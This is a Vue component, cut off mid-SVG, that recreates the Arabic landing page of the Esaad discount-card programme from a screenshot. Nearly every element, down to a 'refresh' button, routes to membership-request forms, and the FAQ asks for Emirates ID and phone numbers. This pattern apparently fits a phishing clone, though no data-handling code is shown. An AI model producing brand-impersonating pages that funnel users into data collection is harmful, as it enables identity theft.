<script setup lang="ts">
import { ref, computed } from 'vue'
import { useRouter } from 'vue-router'
import { ChevronDown, Search, Menu, X, RefreshCw } from 'lucide-vue-next'

const router = useRouter()

const navigateToForm = () => {
  router.push('/request')
}

const navigateToCompanyForm = () => {
  router.push('/register-company')
}

const mobileMenuOpen = ref(false)
const searchOpen = ref(false)
const searchQuery = ref('')
const activeSlide = ref(1)

const heroSlides = [
  {
    id: 0,
    title: 'عالم من العروض الحصرية والمزايا المتجددة لحاملي بطاقة إسعاد',
  },
  {
    id: 1,
    title: 'استمتع بالمكافآت وعزّز أسلوب حياتك',
  }
]

const faqs = ref([
  {
    id: 1,
    question: 'عملية تفعيل حساب إسعاد( للأشخاص المنضمين إلى البرنامج)',
    answer: 'لتفعيل حساب إسعاد الخاص بك، يرجى الدخول إلى صفحة تسجيل العضوية وإدخال رقم الهوية الإماراتية ورقم الهاتف المتحرك المسجل لاستكمال خطوات التفعيل بنجاح.',
    open: false
  },
  {
    id: 2,
    question: 'تسجيل الدخول إلى تطبيق إسعاد',
    answer: 'يمكنك تسجيل الدخول إلى تطبيق إسعاد باستخدام البريد الإلكتروني المعتمد أو الهوية الرقمية (UAE PASS) للاستفادة الفورية من كافة الخصومات والعروض.',
    open: false
  },
  {
    id: 3,
    question: 'تحديد عدد الأجهزة',
    answer: 'يُسمح بتسجيل الدخول إلى حساب بطاقة إسعاد على عدد محدد من الأجهزة الذكية لضمان أمان الحساب وحماية بيانات العضوية.',
    open: false
  },
  {
    id: 4,
    question: 'التواصل معنا',
    answer: 'يمكنكم التواصل مع مركز بطاقة إسعاد عبر قنوات الاتصال الرسمية أو من خلال نموذج الاستفسارات المتاح في الموقع والتطبيق على مدار الساعة.',
    open: false
  },
  {
    id: 5,
    question: 'استرداد العروض',
    answer: 'استمتع باسترداد العروض في المتاجر عبر إبراز بطاقة إسعاد الرقمية أو استخدام الرمز الترويجي المخصص عند التسوق الإلكتروني.',
    open: false
  },
  {
    id: 6,
    question: 'تفضيلات اللغة',
    answer: 'يدعم تطبيق وموقع إسعاد اللغتين العربية والإنجليزية، ويمكنك تغيير اللغة المفضلة في أي وقت من خلال إعدادات الحساب.',
    open: false
  },
  {
    id: 7,
    question: 'الوصول إلى بطاقة إسعاد',
    answer: 'يمكنك الوصول إلى بطاقة إسعاد الرقمية مباشرة عبر التطبيق الذكي أو طلب إصدار وتوصيل البطاقة من خلال بوابة الخدمات.',
    open: false
  },
  {
    id: 8,
    question: 'المتاجر المفضلة',
    answer: 'يتيح لك التطبيق إمكانية حفظ العلامات التجارية والعروض المفضلة لديك في قائمة خاصة للوصول إليها بسرعة في أي وقت.',
    open: false
  },
  {
    id: 9,
    question: 'حذف حسابي',
    answer: 'يمكنك تقديم طلب إدارة أو إلغاء الحساب من خلال إعدادات الملف الشخصي في تطبيق إسعاد أو بالتواصل مع فريق الدعم الفني.',
    open: false
  }
])

const toggleFaq = (id: number) => {
  const item = faqs.value.find(f => f.id === id)
  if (item) {
    item.open = !item.open
  }
}

const filteredFaqs = computed(() => {
  if (!searchQuery.value.trim()) return faqs.value
  return faqs.value.filter(
    f => f.question.includes(searchQuery.value) || f.answer.includes(searchQuery.value)
  )
})
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900 relative overflow-x-hidden select-none">

    <!-- ======================== HERO & HEADER SECTION ======================== -->
    <section class="relative w-full h-[540px] bg-[#040c06] overflow-hidden flex flex-col justify-between">
      
      <!-- 3D Background Stage & Sculpture Illustration (Matching Screenshot) -->
      <div class="absolute inset-0 pointer-events-none overflow-hidden">
        <!-- Deep ambient radial glow -->
        <div class="absolute inset-0 bg-[radial-gradient(circle_at_50%_38%,_rgba(32,120,56,0.35)_0%,_rgba(6,24,11,0.85)_55%,_#020603_100%)]"></div>

        <!-- 3D Sculpture & Podium SVG -->
        <svg viewBox="0 0 430 540" class="w-full h-full object-cover" preserveAspectRatio="xMidYMid slice">
          <defs>
            <linearGradient id="metal3d" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" stop-color="#8da390" />
              <stop offset="40%" stop-color="#4e6752" />
              <stop offset="75%" stop-color="#253528" />
              <stop offset="100%" stop-color="#111a13" />
            </linearGradient>
            <linearGradient id="green3d" x1="0%" y1="0%" x2="0%" y2="100%">
              <stop offset="0%" stop-color="#5cc551" />
              <stop offset="55%" stop-color="#2c8e35" />
              <stop offset="100%" stop-color="#124719" />
            </linearGradient>
            <linearGradient id="podiumTop" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#051308" />
              <stop offset="25%" stop-color="#1b5e28" />
              <stop offset="50%" stop-color="#38b649" />
              <stop offset="75%" stop-color="#1b5e28" />
              <stop offset="100%" stop-color="#051308" />
            </linearGradient>
            <linearGradient id="floorGlow" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#040d06" />
              <stop offset="50%" stop-color="#1e6b2b" />
              <stop offset="100%" stop-color="#040d06" />
            </linearGradient>
            <filter id="neonGlow" x="-20%" y="-20%" width="140%" height="140%">
              <feGaussianBlur stdDeviation="4" result="blur" />
              <feComposite in="SourceGraphic" in2="blur" operator="over" />
            </filter>
          </defs>

          <!-- Subtle background radial tech lines -->
          <ellipse cx="215" cy="190" rx="175" ry="175" fill="none" stroke="#1b4323" stroke-width="1" opacity="0.35" />
          <ellipse cx="215" cy="190" rx="135" ry="135" fill="none" stroke="#235c2e" stroke-width="1.5" opacity="0.3" />

          <!-- 3D Extruded Depth Shadow behind Logo -->
          <g transform="translate(6, 7)" opacity="0.65">
            <!-- Arabic إسعاد 3D shadow -->
            <text x="215" y="135" text-anchor="middle" fill="#09150b" font-family="Tajawal, Cairo, sans-serif" font-weight="900" font-size="88" letter-spacing="-2">إسعاد</text>
            <!-- English esaad 3D shadow -->
            <text x="215" y="218" text-anchor="middle" fill="#09150b" font-family="Tajawal, Cairo, sans-serif" font-weight="900" font-size="84" letter-spacing="-1">esaad</text>
            <!-- Smile curve shadow -->
            <path d="M 105 260 Q 215 345 325 260" fill="none" stroke="#09150b" stroke-width="22" stroke-linecap="round" />
          </g>

          <!-- 3D Extruded Bevel Layer -->
          <g transform="translate(3, 3.5)" opacity="0.85">
            <text x="215" y="135" text-anchor="middle" fill="#1e3322" font-family="Tajawal, Cairo, sans-serif" font-weight="900" font-size="88" letter-spacing="-2">إسعاد</text>
            <text x="215" y="218" text-anchor="middle" fill="#1b4d21" font-family="Tajawal, Cairo, sans-serif" font-weight="900" font-size="84" letter-spacing="-1">esaad</text>
            <path d="M 105 260 Q 215 345 325 260" fill="none" stroke="#243827" stroke-width="20" stroke-linecap="round" />
          </g>

          <!-- Main 3D Metallic & Green Sculpture Front Face -->
          <g>
            <!-- Vertical bar on right of Arabic logo -->
            <rect x="315" y="65" width="16" height="75" rx="6" fill="url(#green3d)" />
            <circle cx="323" cy="152" r="7" fill="#5cc551" />

            <!-- Arabic إسعاد -->
            <text x="202" y="135" text-anchor="middle" fill="url(#metal3d)" font-family="Tajawal, Cairo, sans-serif" font-weight="900" font-size="86" letter-spacing="-1">سعاد</text>

            <!-- English esaad -->
            <text x="215" y="218" text-anchor="middle" fill="url(#green3d)" font-family="Tajawal, Cairo, sans-serif" font-weight="900" font-size="84" letter-spacing="-1">esaad</text>

            <!-- Two Eyes/Dots above the Smile -->
            <circle cx="146" cy="245" r="10" fill="url(#metal3d)" />
            <circle cx="284" cy="245" r="10" fill="url(#metal3d)" />

            <!-- Iconic 3D Smile Arc -->
            <path d="M 105 262 Q 215 346 325 262" fill="none" stroke="url(#metal3d)" stroke-width="18" stroke-linecap="round" />

            <!-- Base connector stand -->
            <rect x="165" y="312" width="100" height="35" rx="4" fill="#152218" />
          </g>

          <!-- 3D Futuristic Circular Stage Podium -->
          <g transform="translate(0, 15)">
            <!-- Outer stage steps -->
            <ellipse cx="215" cy="465" rx="250" ry="52" fill="#071109" stroke="#1c3b22" stroke-width="1.5" />
            <ellipse cx="215" cy="452" rx="220" ry="44" fill="#0b1a0e" stroke="#275930" stroke-width="1.5" />
            <ellipse cx="215" cy="442" rx="190" ry="35" fill="url(#floorGlow)" opacity="0.7" />

            <!-- Podium Cylinder Base -->
            <path d="M 85 370 L 85 415 A 130 26 0 0 0 345 415 L 345 370 Z" fill="url(#podiumTop)" opacity="0.85" />
            <ellipse cx="215" cy="415" rx="130" ry="26" fill="none" stroke="#48d159" stroke-width="2.5" filter="url(#neonGlow)" />

            <!-- Podium Upper Tier -->
            <ellipse cx="215" cy="370" rx="130" ry="24" fill="#0b1d0e" stroke="#53df65" stroke-width="3" filter="url(#neonGlow)" />
            <ellipse cx="215" cy="366" rx="108" ry="18" fill="#133319" stroke="#2ea843" stroke-width="1.5" />
          </g>
        </svg>

        <!-- Measured dark scrim for crisp text legibility -->
        <div class="absolute inset-0 bg-gradient-to-b from-black/70 via-black/25 to-black/75"></div>
      </div>

      <!-- Top Navigation Bar -->
      <header class="relative z-20 flex items-center justify-between px-5 pt-4 pb-3">
        <!-- Right in RTL: Hamburger Menu Button -->
        <button
          @click="mobileMenuOpen = true"
          aria-label="القائمة الرئيسية"
          class="text-white p-1.5 hover:opacity-80 transition-opacity cursor-pointer"
        >
          <svg class="w-7 h-7" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round">
            <line x1="3" y1="6" x2="21" y2="6" />
            <line x1="3" y1="12" x2="21" y2="12" />
            <line x1="3" y1="18" x2="21" y2="18" />
          </svg>
        </button>

        <!-- Center: Esaad Header Logo -->
        <div @click="navigateToForm" class="cursor-pointer flex flex-col items-center select-none">
          <div class="text-[#39b54a] font-black text-xl leading-none tracking-tight">إسعاد</div>
          <div class="text-[#39b54a] font-extrabold text-lg leading-none -mt-0.5 tracking-tight">esaad</div>
          <svg class="w-12 h-3.5 -mt-0.5" viewBox="0 0 60 18" fill="none">
            <circle cx="14" cy="4" r="2" fill="#39b54a" />
            <circle cx="46" cy="4" r="2" fill="#39b54a" />
            <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
          </svg>
        </div>

        <!-- Left in RTL: Green Search Icon -->
        <button
          @click="searchOpen = !searchOpen"
          aria-label="بحث"
          class="text-[#009a44] p-1.5 hover:opacity-80 transition-opacity cursor-pointer"
        >
          <Search class="w-6 h-6 stroke-[2.4]" />
        </button>
      </header>

      <!-- Optional Search Bar Dropdown -->
      <div v-if="searchOpen" class="relative z-20 px-5">
        <div class="bg-black/85 backdrop-blur-md border border-[#009a44]/60 rounded-xl p-2.5 flex items-center gap-2 shadow-lg">
          <Search class="w-5 h-5 text-[#39b54a] shrink-0" />
          <input
            v-model="searchQuery"
            type="text"
            placeholder="ابحث في عروض وخدمات إسعاد..."
            class="w-full bg-transparent text-white placeholder-gray-400 text-sm focus:outline-none"
          />
          <button @click="navigateToForm" class="bg-[#009a44] text-white text-xs font-bold px-3 py-1.5 rounded-lg whitespace-nowrap shrink-0">
            طلب البطاقة
          </button>
        </div>
      </div>

      <!-- Center-Right Hero Headline & Two Membership Action Buttons -->
      <div class="relative z-10 px-5 my-auto pt-8">
        <h1
          @click="navigateToForm"
          class="text-white font-extrabold text-[22px] leading-[1.4] text-right drop-shadow-md cursor-pointer mb-5"
          style="text-wrap: balance;"
        >
          {{ heroSlides[activeSlide].title }}
        </h1>

        <div class="flex flex-col sm:flex-row gap-3">
          <button
            @click="navigateToForm"
            class="flex-1 bg-[#009a44] hover:bg-[#008038] text-white font-extrabold text-sm py-3 px-4 rounded-xl shadow-lg transition-colors cursor-pointer"
          >
            تفعيل عضوية أفراد
          </button>
          <button
            @click="navigateToCompanyForm"
            class="flex-1 bg-white/95 hover:bg-white text-[#008a40] border border-[#009a44] font-extrabold text-sm py-3 px-4 rounded-xl shadow-lg transition-colors cursor-pointer"
          >
            تفعيل عضوية شركات
          </button>
        </div>
      </div>

      <!-- Bottom Carousel Indicators -->
      <div class="relative z-10 pb-4 flex items-center justify-center gap-2.5">
        <button
          @click="activeSlide = 0"
          aria-label="الشريحة الأولى"
          class="w-3 h-3 rounded-full border border-[#009a44] transition-colors cursor-pointer"
          :class="activeSlide === 0 ? 'bg-[#009a44]' : 'bg-transparent'"
        ></button>
        <button
          @click="activeSlide = 1"
          aria-label="الشريحة الثانية"
          class="w-3 h-3 rounded-full border border-[#009a44] transition-colors cursor-pointer"
          :class="activeSlide === 1 ? 'bg-[#009a44]' : 'bg-transparent'"
        ></button>
      </div>
    </section>

    <!-- Slide-out Navigation Drawer -->
    <div v-if="mobileMenuOpen" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex justify-start">
      <div class="w-72 bg-[#07170b] text-white h-full p-6 flex flex-col justify-between shadow-2xl border-l border-[#009a44]/30">
        <div>
          <div class="flex items-center justify-between pb-5 border-b border-white/10">
            <div class="flex flex-col items-start">
              <span class="text-[#39b54a] font-black text-lg leading-none">إسعاد</span>
              <span class="text-[#39b54a] font-bold text-xs tracking-tight">esaad</span>
            </div>
            <button @click="mobileMenuOpen = false" class="p-1.5 text-gray-300 hover:text-white">
              <X class="w-5 h-5" />
            </button>
          </div>

          <nav class="mt-5 space-y-3.5 text-right font-bold text-sm">
            <a href="#about" @click="mobileMenuOpen = false" class="block py-1.5 text-white hover:text-[#39b54a] transition-colors">عن برنامج إسعاد</a>
            <a href="#news" @click="mobileMenuOpen = false" class="block py-1.5 text-white hover:text-[#39b54a] transition-colors">جميع الأخبار</a>
            <a href="#faq" @click="mobileMenuOpen = false" class="block py-1.5 text-white hover:text-[#39b54a] transition-colors">الأسئلة الشائعة</a>
            <button @click="navigateToForm" class="w-full text-right py-1.5 text-[#39b54a] hover:underline cursor-pointer">تفعيل عضوية أفراد</button>
            <button @click="navigateToCompanyForm" class="w-full text-right py-1.5 text-white hover:text-[#39b54a] transition-colors cursor-pointer">تفعيل عضوية شركات</button>
          </nav>
        </div>

        <div class="space-y-2.5">
          <button
            @click="navigateToForm"
            class="w-full bg-[#009a44] hover:bg-[#008038] text-white font-bold text-sm py-3 rounded-xl shadow-lg transition-colors cursor-pointer"
          >
            تفعيل عضوية أفراد
          </button>
          <button
            @click="navigateToCompanyForm"
            class="w-full bg-white/10 hover:bg-white/20 text-white border border-[#39b54a]/50 font-bold text-sm py-3 rounded-xl transition-colors cursor-pointer"
          >
            تفعيل عضوية شركات
          </button>
        </div>
      </div>
    </div>

    <!-- ======================== ABOUT ESAAD SECTION ======================== -->
    <section id="about" class="px-5 pt-8 pb-7 bg-white relative">
      <h2 class="text-[21px] font-extrabold text-gray-900 text-right mb-3">
        عن برنامج اسعاد
      </h2>
      <p class="text-gray-700 text-[13.5px] leading-[1.7] text-right font-medium mb-5">
        تطبيق بطاقة إسعاد هو برنامج مميّز و فريد من نوعه يتضمّن عروضاً مميزة وأخرى حصرية، في قطاعات متعددة بما يساهم في تحقيق التوفير المالي.
      </p>

      <!-- Collage Area: Tilted Esaad Card + Lifestyle Photos + Floating Refresh Widget -->
      <div class="relative w-full h-[310px] my-2" dir="ltr">
        
        <!-- Top-Right Rounded Photo: Emirati Family Sightseeing -->
        <div
          @click="navigateToForm"
          class="absolute right-6 top-0 w-[148px] h-[162px] rounded-2xl overflow-hidden shadow-lg border border-gray-100 z-10 cursor-pointer bg-[#dce8f2]"
        >
          <svg viewBox="0 0 150 165" class="w-full h-full object-cover">
            <defs>
              <linearGradient id="skyGrad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stop-color="#c9dff2" />
                <stop offset="100%" stop-color="#eef5fa" />
              </linearGradient>
            </defs>
            <rect width="150" height="165" fill="url(#skyGrad)" />
            <!-- Architectural arch/balcony backdrop -->
            <path d="M0 30 Q45 10 95 0 L150 0 L150 165 L0 165 Z" fill="#e6ecf2" opacity="0.6" />
            <line x1="15" y1="0" x2="85" y2="165" stroke="#9ab0c7" stroke-width="1.5" opacity="0.5" />
            <!-- Person 1 (Right Emirati Man in White Kandura & Ghutra) -->
            <path d="M88 78 Q112 76 124 160 L72 160 Z" fill="#ffffff" />
            <ellipse cx="102" cy="58" rx="13" ry="15" fill="#d59b78" />
            <path d="M88 58 Q102 68 112 58 L112 68 Q102 74 90 68 Z" fill="#3a2618" />
            <path d="M84 48 Q102 36 120 50 L125 98 L112 96 L110 56 L88 56 Z" fill="#ffffff" />
            <ellipse cx="103" cy="45" rx="15" ry="4" fill="#1a1a1a" />
            <!-- Raising arm pointing -->
            <path d="M95 85 L45 68 L48 58 L104 75 Z" fill="#f8fafc" />
            <!-- Person 2 (Center Man in White Kandura) -->
            <path d="M40 82 Q62 82 72 162 L24 162 Z" fill="#f1f5f9" />
            <ellipse cx="52" cy="63" rx="12" ry="14" fill="#c98e6b" />
            <path d="M38 52 Q52 42 66 52 L68 95 L36 95 Z" fill="#ffffff" />
            <ellipse cx="52" cy="49" rx="13" ry="3.5" fill="#1a1a1a" />
            <!-- Young Boy in Front with Yellow Cap -->
            <path d="M85 130 Q105 128 115 165 L75 165 Z" fill="#1e293b" />
            <circle cx="96" cy="112" r="12" fill="#dfab8b" />
            <path d="M83 108 Q96 96 110 108 Z" fill="#facc15" />
            <path d="M76 108 L98 108 L96 112 L75 111 Z" fill="#eab308" />
          </svg>
        </div>

        <!-- Left Tilted Green Esaad Card -->
        <div
          @click="navigateToForm"
          class="absolute left-3 top-10 w-[198px] h-[126px] rounded-xl shadow-xl z-10 transform -rotate-[14deg] cursor-pointer overflow-hidden border border-[#2ebd59]/40"
          style="background: linear-gradient(135deg, #009944 0%, #007b36 55%, #005e28 100%);"
        >
          <!-- Subtle card wave pattern -->
          <svg class="absolute inset-0 w-full h-full opacity-20" viewBox="0 0 200 130" fill="none">
            <path d="M-20 110 Q 60 50 220 90" stroke="#7ce895" stroke-width="1" />
            <path d="M-20 120 Q 70 60 220 100" stroke="#7ce895" stroke-width="1" />
            <path d="M-20 100 Q 50 40 220 80" stroke="#7ce895" stroke-width="1" />
          </svg>

          <!-- Gold Chip on Right -->
          <div class="absolute right-4 top-10 w-8 h-6 rounded-sm bg-gradient-to-br from-[#f6d365] to-[#cda349] border border-yellow-600/50 flex items-center justify-center">
            <div class="w-5 h-3.5 border border-yellow-800/40 rounded-xs"></div>
          </div>

          <!-- Center Esaad White/Light-Green Emblem -->
          <div class="absolute inset-0 flex flex-col items-center justify-center pointer-events-none">
            <span class="text-[#a3e6b5] font-black text-xl leading-none">إسعاد</span>
            <span class="text-[#a3e6b5] font-extrabold text-lg leading-none -mt-0.5">esaad</span>
            <svg class="w-12 h-3.5 -mt-0.5" viewBox="0 0 60 18" fill="none">
              <circle cx="14" cy="4" r="2" fill="#a3e6b5" />
              <circle cx="46" cy="4" r="2" fill="#a3e6b5" />
              <path d="M 6 6 Q 30 18 54 6" stroke="#a3e6b5" stroke-width="3" stroke-linecap="round" />
            </svg>
          </div>

          <!-- Card Holder Name & Number at Bottom Left -->
          <div class="absolute bottom-2.5 left-3.5 text-left leading-tight">
            <div class="text-[8px] font-bold tracking-wider text-[#b6f0c6] uppercase">ESAAD CARD HOLDER NAME</div>
            <div class="text-[7px] font-mono text-[#9be2b0] tracking-wider">784-1234-1234567-1</div>
          </div>
        </div>

        <!-- Center Overlapping Rounded Photo: Cafe Meeting -->
        <div
          @click="navigateToForm"
          class="absolute left-[155px] top-[112px] w-[112px] h-[118px] rounded-2xl overflow-hidden shadow-xl border-2 border-white z-20 cursor-pointer bg-[#2c343c]"
        >
          <svg viewBox="0 0 120 125" class="w-full h-full object-cover">
            <!-- Window & Cafe Background -->
            <rect width="120" height="125" fill="#374151" />
            <rect x="12" y="0" width="60" height="75" fill="#d1fae5" opacity="0.35" />
            <!-- Left Woman in Black Abaya & Shayla -->
            <path d="M12 52 Q30 50 38 115 L5 115 Z" fill="#111827" />
            <circle cx="24" cy="42" r="8" fill="#d6a284" />
            <path d="M14 34 Q24 28 32 38 L34 62 L12 60 Z" fill="#0f172a" />
            <!-- Center Woman in Black Abaya -->
            <path d="M40 50 Q55 48 64 105 L34 105 Z" fill="#182232" />
            <circle cx="50" cy="40" r="7.5" fill="#d6a284" />
            <path d="M41 33 Q50 28 58 36 L60 58 L40 58 Z" fill="#090d16" />
            <!-- Right Man in White Kandura -->
            <path d="M78 48 Q98 48 112 115 L68 115 Z" fill="#f8fafc" />
            <circle cx="90" cy="36" r="8.5" fill="#c68b68" />
            <path d="M79 27 Q90 20 102 29 L106 64 L76 62 Z" fill="#ffffff" />
            <!-- Cafe Table in Foreground -->
            <path d="M5 100 L115 88 L120 125 L0 125 Z" fill="#b89f82" />
            <rect x="44" y="92" width="12" height="8" rx="1" fill="#ffffff" />
            <circle cx="72" cy="96" r="5" fill="#f3f4f6" />
          </svg>
        </div>

        <!-- Bottom-Right Small Rounded Photo: Handshake -->
        <div
          @click="navigateToForm"
          class="absolute right-[70px] bottom-2 w-[78px] h-[78px] rounded-2xl overflow-hidden shadow-md border border-gray-100 z-10 cursor-pointer bg-[#e0f2fe]"
        >
          <svg viewBox="0 0 80 80" class="w-full h-full object-cover">
            <rect width="80" height="80" fill="#dbeafe" />
            <rect x="8" y="0" width="64" height="80" fill="#eff6ff" />
            <!-- Left Arm in White Kandura Sleeve -->
            <path d="M0 32 L34 40 L30 52 L0 46 Z" fill="#ffffff" stroke="#cbd5e1" stroke-width="1" />
            <!-- Right Arm in Dark Suit Sleeve -->
            <path d="M80 28 L44 38 L48 50 L80 42 Z" fill="#1e293b" />
            <!-- Clasped Hands in Center -->
            <ellipse cx="40" cy="43" rx="9" ry="6" fill="#d29976" />
          </svg>
        </div>

        <!-- Green Circle Smile Icon on Right of Bottom Photo -->
        <div class="absolute right-3 top-[175px] w-9 h-9 rounded-full bg-[#009a44] flex items-center justify-center shadow-md">
          <svg class="w-6 h-4" viewBox="0 0 36 22" fill="none">
            <circle cx="9" cy="5" r="2" fill="white" />
            <circle cx="27" cy="5" r="2" fill="white" />
            <path d="M 4 9 Q 18 20 32 9" stroke="white" stroke-width="3" stroke-linecap="round" />
          </svg>
        </div>

        <!-- Floating White Square Refresh/Accessibility Button on Far Right -->
        <button
          @click="navigateToForm"
          aria-label="تحديث"
          class="absolute -right-5 top-[210px] w-14 h-12 bg-white rounded-l-xl shadow-[0_4px_20px_rgba(0,0,0,0.15)] border border-gray-100 flex items-center justify-center z-30 cursor-pointer hover:bg-gray-50"
        >
          <RefreshCw class="w-6 h-6 text-[#2563eb] stroke-[2.2]" />
        </button>
      </div>

      <!-- Features List Under Collage -->
      <div class="mt-6 space-y-6">
        <!-- Feature 1: خصومات مذهلة -->
        <div class="flex items-start gap-4">
          <div class="w-11 h-11 rounded-full border-[1.8px] border-[#009a44] flex items-center justify-center shrink-0 mt-1 text-[#009a44]">
            <svg class="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <line x1="19" y1="5" x2="5" y2="19" />
              <circle cx="6.5" cy="6.5" r="2.5" />
              <circle cx="17.5" cy="17.5" r="2.5" />
            </svg>
          </div>
          <div class="text-right">
            <h3 class="text-[#009a44] font-extrabold text-[19px] mb-1">خصومات مذهلة</h3>
            <p class="text-gray-700 text-[15px] leading-relaxed font-medium">
              استمتع بعروض خاصة مع كل عملية شراء تقوم بها وتمتع بخصومات تبدأ من 20% إلى 70%!
            </p>
          </div>
        </div>

        <!-- Feature 2: القطاعات -->
        <div class="flex items-start gap-4">
          <div class="w-11 h-11 rounded-full border-[1.8px] border-[#009a44] flex items-center justify-center shrink-0 mt-1 text-[#009a44]">
            <svg class="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
              <rect x="5" y="7" width="14" height="10" rx="2" />
              <circle cx="12" cy="12" r="2" />
              <path d="M8 4.5 A8 8 0 0 1 19.5 9" stroke-linecap="round" />
              <path d="M16 19.5 A8 8 0 0 1 4.5 15" stroke-linecap="round" />
            </svg>
          </div>
          <div class="text-right">
            <h3 class="text-[#009a44] font-extrabold text-[19px] mb-1">القطاعات</h3>
            <p class="text-gray-700 text-[15px] leading-relaxed font-medium">
              المكافآت متوفرة في التعليم والصحة ومراكز التسوق والسفر والمطاعم وأكثر من ذلك بكثير.
            </p>
          </div>
        </div>
      </div>

      <!-- Direct CTA Buttons: تفعيل عضوية أفراد & تفعيل عضوية شركات -->
      <div class="mt-7 grid grid-cols-1 sm:grid-cols-2 gap-3">
        <button
          @click="navigateToForm"
          class="w-full bg-[#008a40] hover:bg-[#007335] text-white font-extrabold text-base py-3.5 rounded-xl shadow-md transition-colors cursor-pointer"
        >
          تفعيل عضوية أفراد
        </button>
        <button
          @click="navigateToCompanyForm"
          class="w-full bg-white hover:bg-[#f3f9f5] text-[#008a40] border-2 border-[#008a40] font-extrabold text-base py-3.5 rounded-xl shadow-xs transition-colors cursor-pointer"
        >
          تفعيل عضوية شركات
        </button>
      </div>
    </section>

    <!-- ======================== STATISTICS SECTION ======================== -->
    <section class="bg-[#eef5f0] px-6 py-8">
      <div class="divide-y divide-gray-200/90">
        
        <!-- Stat 1: 6,535 العلامات التجارية -->
        <div class="py-7 first:pt-2 flex items-center justify-center gap-5">
          <!-- Right in RTL: Building Icon -->
          <div class="text-[#009a44] shrink-0">
            <svg class="w-16 h-16" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M18 56V18L34 10V56" />
              <path d="M34 24H48V56" />
              <line x1="10" y1="56" x2="54" y2="56" />
              <line x1="23" y1="22" x2="29" y2="22" />
              <line x1="23" y1="28" x2="29" y2="28" />
              <line x1="23" y1="34" x2="29" y2="34" />
              <line x1="23" y1="40" x2="29" y2="40" />
              <line x1="23" y1="46" x2="29" y2="46" />
              <rect x="39" y="30" width="4" height="4" rx="0.5" />
              <rect x="39" y="38" width="4" height="4" rx="0.5" />
              <rect x="39" y="46" width="4" height="4" rx="0.5" />
              <line x1="24" y1="14" x2="24" y2="8" />
            </svg>
          </div>
          <!-- Left in RTL: Number & Label -->
          <div class="text-right">
            <div class="text-[#008a40] font-extrabold text-[34px] leading-tight tabular-nums">6,535</div>
            <div class="text-gray-900 font-extrabold text-[20px]">العلامات التجارية</div>
          </div>
        </div>

        <!-- Stat 2: 11,486 عروض -->
        <div class="py-7 flex items-center justify-center gap-5">
          <!-- Right in RTL: Deal Tag Icon -->
          <div class="text-[#009a44] shrink-0">
            <svg class="w-16 h-16" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M12 20H36L52 36L36 52L12 36V20Z" />
              <circle cx="42" cy="36" r="2.5" />
              <line x1="20" y1="32" x2="30" y2="22" />
              <circle cx="21" cy="24" r="2" />
              <circle cx="29" cy="30" r="2" />
              <text x="23" y="43" fill="currentColor" stroke="none" font-size="8" font-weight="800" transform="rotate(-35 28 40)">DEAL</text>
            </svg>
          </div>
          <!-- Left in RTL: Number & Label -->
          <div class="text-right">
            <div class="text-[#008a40] font-extrabold text-[34px] leading-tight tabular-nums">11,486</div>
            <div class="text-gray-900 font-extrabold text-[20px]">عروض</div>
          </div>
        </div>

        <!-- Stat 3: 1,279,391 الزيارات -->
        <div class="py-7 last:pb-2 flex items-center justify-center gap-5">
          <!-- Right in RTL: Location Pin Icon -->
          <div class="text-[#009a44] shrink-0">
            <svg class="w-16 h-16" viewBox="0 0 64 64" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M32 52C32 52 48 37 48 24C48 15.1634 40.8366 8 32 8C23.1634 8 16 15.1634 16 24C16 37 32 52 32 52Z" />
              <circle cx="32" cy="24" r="7" />
              <ellipse cx="32" cy="53" rx="16" ry="4.5" />
            </svg>
          </div>
          <!-- Left in RTL: Number & Label -->
          <div class="text-right">
            <div class="text-[#008a40] font-extrabold text-[34px] leading-tight tabular-nums">1,279,391</div>
            <div class="text-gray-900 font-extrabold text-[20px]">الزيارات</div>
          </div>
        </div>

      </div>
    </section>

    <!-- ======================== ALL NEWS SECTION ======================== -->
    <section id="news" class="py-10 bg-white">
      <div class="px-5 flex items-center justify-between mb-6">
        <h2 class="text-[25px] font-extrabold text-gray-900">جميع الأخبار</h2>
        <button @click="navigateToForm" class="text-[#008a40] font-bold text-sm hover:underline cursor-pointer">
          عرض الكل
        </button>
      </div>

      <!-- Horizontal News Cards Strip -->
      <div class="flex gap-4 overflow-x-auto px-5 pb-4 snap-x snap-mandatory no-scrollbar">
        
        <!-- News Card 1 (Main Right Card in Screenshot) -->
        <article
          @click="navigateToForm"
          class="min-w-[260px] max-w-[260px] bg-white rounded-2xl shadow-[0_4px_20px_rgba(0,0,0,0.06)] border border-gray-100 overflow-hidden snap-start shrink-0 cursor-pointer"
        >
          <div class="w-full h-40 bg-[#d5e3ec] relative overflow-hidden">
            <!-- Custom SVG Illustration of the 5 Officials Ceremony Photo -->
            <svg viewBox="0 0 260 160" class="w-full h-full object-cover">
              <!-- Indoor Wall & Green Esaad Partition -->
              <rect width="260" height="160" fill="#e2e8f0" />
              <rect x="0" y="0" width="95" height="160" fill="#0d6e38" />
              <rect x="115" y="15" width="75" height="115" fill="#cbd5e1" stroke="#94a3b8" stroke-width="2" />
              <!-- 5 Officials standing left-to-right -->
              <!-- 1. Left Woman in Maroon Hijab & Black Abaya -->
              <path d="M12 85 Q28 83 36 160 L4 160 Z" fill="#18181b" />
              <circle cx="22" cy="66" r="9" fill="#e2b296" />
              <path d="M12 58 Q22 50 32 58 L33 88 L11 88 Z" fill="#4c1d24" />
              <!-- 2. Woman in Light Gray Suit -->
              <path d="M46 82 Q62 82 70 160 L38 160 Z" fill="#d1d5db" />
